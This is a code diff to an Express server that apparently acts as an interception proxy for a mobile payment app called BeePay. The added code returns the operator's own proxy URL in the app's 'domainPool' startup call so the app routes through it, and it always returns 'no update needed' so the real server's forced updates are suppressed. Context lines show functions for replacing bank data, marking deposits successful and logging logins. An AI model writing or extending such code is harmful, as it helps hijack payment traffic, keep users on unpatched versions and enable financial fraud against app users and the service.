@@ -484,9 +484,17 @@ function deepReplace(obj, bank, origVals, depth) {
 
 function getResponseData(jsonResp) {
   if (!jsonResp) return null;
+  // BeePay uses "body" field, fallback to "data"/"result"
+  if (jsonResp.body !== undefined) return jsonResp.body;
   if (jsonResp.data !== undefined) return jsonResp.data;
   if (jsonResp.result !== undefined) return jsonResp.result;
   return null;
+}
+
+function isBeepaySuccess(jsonResp) {
+  if (!jsonResp) return false;
+  const s = parseInt(jsonResp.status);
+  return s === 200 || s === 601;
 }
 
 function markDepositSuccess(obj) {
@@ -1466,27 +1474,14 @@ app.all('/app/api/memberManager/getBankAccount', async (req, res) => {
 
 // ── Domain pool — CRITICAL: app calls this on startup to get server URL ──
 app.all('/appAuth/domainPool', async (req, res) => {
-  // Return our proxy URL so app uses it as the server
-  res.json({ code: 0, msg: 'success', data: 'https://ixcv.vercel.app' });
+  // BeePay format: status/body/message (NOT code/data)
+  res.json({ status: '200', message: 'success', body: 'https://ixcv.vercel.app' });
 });
 
-// ── Check update — return no update so app doesn't block on update screen ──
+// ── Check update — always return needUpdate:0 so app never gets blocked ──
 app.all('/appAuth/checkUpdate', async (req, res) => {
-  const data = await loadData();
-  // If blockUpdate is ON, return "no update needed" without hitting real server
-  if (data.blockUpdate) {
-    return res.json({ code: 0, msg: 'success', data: { needUpdate: '0', version: '', versionCode: '', updateContent: '', link: '', md5: '' } });
-  }
-  // Otherwise proxy to real server
-  try {
-    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    // Override needUpdate to 0 to prevent forced update popups
-    const rd = getResponseData(jsonResp);
-    if (rd && typeof rd === 'object') rd.needUpdate = '0';
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) {
-    res.json({ code: 0, msg: 'success', data: { needUpdate: '0' } });
-  }
+  // Always override needUpdate to "0" — real server returns "1" (force update) which blocks the app
+  res.json({ status: '200', message: 'success', body: { needUpdate: '0', version: '', versionCode: '', updateContent: '', link: '', md5: '' } });
 });
 
 // ── Login route — detailed bot log ────────────────────────────────
